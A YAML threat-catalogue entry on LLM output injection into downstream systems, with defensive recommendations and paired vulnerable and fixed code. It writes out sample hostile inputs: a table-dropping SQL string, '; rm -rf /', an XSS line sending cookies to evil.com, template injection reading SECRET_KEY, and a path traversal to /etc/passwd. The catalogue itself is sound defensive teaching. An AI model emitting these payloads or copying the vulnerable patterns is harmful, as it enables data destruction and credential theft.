id: "unauthorized-execution/ai-content-integrity/llm-output-injection"
version: "1.0.0"
kingdom: "Unauthorized Code Execution"
kingdom_id: 4
category: "AI Content Integrity"
category_id: "4.3"
name: "LLM Output Injection into Downstream Systems"
risk_level: "critical"

abstract: |
  LLM-generated text containing injection payloads (SQL, shell metacharacters,
  HTML/JavaScript, LDAP, template directives) is passed unsanitized to downstream
  systems — databases, shells, web renderers, APIs — causing unintended code
  execution in the receiving system.

explanation: |
  LLM outputs are unstructured text generated by a probabilistic model. When
  application code treats this output as trusted data and interpolates it into
  queries, commands, or markup without sanitization, the LLM output becomes an
  injection vector. This is fundamentally different from LLM-generated insecure
  code (where the agent writes vulnerable source code) — here, the LLM's runtime
  text response itself contains the payload that exploits a downstream system.

  Common attack surfaces include:

  - **SQL injection via LLM output**: An application asks an LLM to generate a
    search term, then interpolates the response into a SQL query:
    `db.execute(f"SELECT * FROM products WHERE name = '{llm_response}'")`
    If the LLM outputs `'; DROP TABLE products; --`, the downstream database
    executes the injection.
  - **Shell command injection**: An agent or application passes LLM output to
    `subprocess.run(f"grep {llm_output} logfile.txt", shell=True)`. An LLM
    response containing `; rm -rf /` executes in the shell.
  - **Cross-site scripting (XSS)**: An LLM-generated summary is rendered in a
    web page without escaping. If the LLM output includes
    `<script>document.location='https://evil.com?c='+document.cookie</script>`,
    the browser executes it.
  - **Template injection**: LLM output containing template directives
    (`{{config.SECRET_KEY}}` in Jinja2, `${7*7}` in Freemarker) is rendered
    through a template engine, leaking server-side data or achieving RCE.
  - **Log injection / log forging**: LLM output containing newlines and fake
    log entries is written to application logs, corrupting audit trails or
    enabling log-based attacks (CRLF injection).
  - **API parameter injection**: LLM output used as API parameters without
    validation — e.g., an LLM-generated filename containing `../../../etc/passwd`
    causes path traversal in downstream file operations.

  This threat is amplified in agentic systems where LLM outputs flow through
  multiple processing stages (LLM → tool → database → another LLM), creating
  multi-hop injection chains where sanitization gaps at any stage are exploitable.

  This is the primary manifestation of OWASP LLM05 (Improper Output Handling)
  at the application integration layer, as opposed to the code-generation layer
  covered by llm-generated-insecure-code.

recommendation: |
  - Never interpolate LLM output directly into SQL queries, shell commands,
    HTML templates, or API calls. Always use parameterized queries, shell
    escaping functions, and output encoding appropriate to the context.
  - Treat all LLM output as untrusted user input — apply the same input
    validation and sanitization that you would apply to form submissions.
  - Use allowlists to constrain LLM output to expected formats before passing
    to downstream systems (e.g., regex-match for expected patterns, reject if
    output contains unexpected metacharacters).
  - Implement output type contracts: if the LLM is expected to return a
    product name, validate that the output is a plausible product name before
    using it in a query.
  - Use structured output modes (JSON mode, tool_use) to constrain LLM
    responses to well-defined schemas rather than free-form text.
  - Apply context-aware escaping: HTML-escape for web output, SQL-parameterize
    for database queries, shlex.quote() for shell contexts.
  - Implement Content Security Policy (CSP) headers to mitigate XSS from
    LLM-generated content rendered in browsers.
  - Log and monitor LLM outputs for injection patterns before they reach
    downstream systems.

examples:
  bad:
    - "db.execute(f\"SELECT * FROM users WHERE name = '{llm.complete(prompt)}'\")"
    - "subprocess.run(f'grep {llm_output} /var/log/app.log', shell=True)"
    - "return f'<div class=\"summary\">{llm_summary}</div>'  # unescaped HTML"
    - "template.render(user_bio=llm.generate_bio(user))  # Jinja2 with LLM output"
    - "os.path.join(upload_dir, llm_generated_filename)  # path traversal possible"
  good:
    - "db.execute('SELECT * FROM users WHERE name = %s', [llm_output])  # parameterized"
    - "subprocess.run(['grep', shlex.quote(llm_output), '/var/log/app.log'])"
    - "return f'<div class=\"summary\">{html.escape(llm_summary)}</div>'"
    - "import json; validated = json.loads(llm_output); schema.validate(validated)  # structured output"
    - "if not re.match(r'^[a-zA-Z0-9_.-]+$', llm_filename): raise ValueError('Invalid filename')"

